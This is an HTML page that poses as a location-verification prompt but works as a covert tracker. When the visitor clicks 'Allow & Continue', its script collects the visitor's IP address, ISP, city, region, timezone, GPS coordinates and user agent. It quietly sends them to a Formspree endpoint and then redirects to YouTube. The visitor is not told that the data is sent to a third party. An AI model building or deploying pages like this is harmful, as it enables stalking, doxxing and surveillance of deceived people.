<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Allow Location</title>
  <style>
    body { font-family: sans-serif; text-align: center; padding: 50px; background: #f4f4f4; }
    button { padding: 12px 24px; font-size: 16px; border-radius: 5px; border: none; background: #2196f3; color: white; cursor: pointer; }
    #locationInfo { margin-top: 20px; font-size: 16px; }
    a { display: block; margin-top: 10px; font-weight: bold; color: #2196f3; }
  </style>
</head>
<body>
  <h2>üìç Please allow location access</h2>
  <p>This helps us verify your location.</p>
  <button onclick="startTracking()">Allow & Continue</button>

  <div id="locationInfo"></div> <!-- üåç Show lat/lon and map link -->

  <script>
    async function getGeoCoords() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve({ latitude: "Not supported", longitude: "Not supported" });
        } else {
          navigator.geolocation.getCurrentPosition(
            position => {
              resolve({
                latitude: position.coords.latitude,
                longitude: position.coords.longitude
              });
            },
            error => {
              resolve({ latitude: "Permission denied", longitude: "Permission denied" });
            },
            { timeout: 10000 }
          );
        }
      });
    }

    async function startTracking() {
      try {
        // IP
        const ipRes = await fetch('https://api64.ipify.org?format=json');
        const ipJson = await ipRes.json();
        const ip = ipJson.ip;

        // Location via IP
        const locRes = await fetch(`https://ipwhois.app/json/${ip}`);
        const locData = await locRes.json();

        // GPS
        const gps = await getGeoCoords();

        // Final data
        const data = {
          ip: ip,
          isp: locData.org || 'N/A',
          country: locData.country || 'N/A',
          city: locData.city || 'N/A',
          region: locData.region || 'N/A',
          timezone: locData.timezone || 'N/A',
          latitude: gps.latitude,
          longitude: gps.longitude,
          user_agent: navigator.userAgent
        };

        // ‚úÖ Show Lat/Lon and Google Maps link
        const infoDiv = document.getElementById("locationInfo");
        if (!isNaN(gps.latitude) && !isNaN(gps.longitude)) {
          const mapURL = `https://www.google.com/maps?q=${gps.latitude},${gps.longitude}`;
          infoDiv.innerHTML = `
            <div>
              üìå <strong>Latitude:</strong> ${gps.latitude}<br>
              üìå <strong>Longitude:</strong> ${gps.longitude}<br>
              <a href="${mapURL}" target="_blank">üåê Google Map ‡¶è ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶¶‡ßá‡¶ñ‡ßÅ‡¶®</a>
            </div>
          `;
        } else {
          infoDiv.innerHTML = `<span style="color:red;">‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶Ö‡¶®‡ßÅ‡¶Æ‡¶§‡¶ø ‡¶™‡¶æ‡¶ì‡ßü‡¶æ ‡¶Ø‡¶æ‡ßü‡¶®‡¶ø‡•§</span>`;
        }

        // Send to Formspree
        await fetch("https://formspree.io/f/mldnbqvo", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });

      } catch (err) {
        console.error("Tracking error:", err);
      } finally {
        // Delay 3s before redirect (so user sees the map link)
        setTimeout(() => {
          window.location.href = "https://youtube.com";
        }, 3000);
      }
    }
  </script>
</body>
</html>
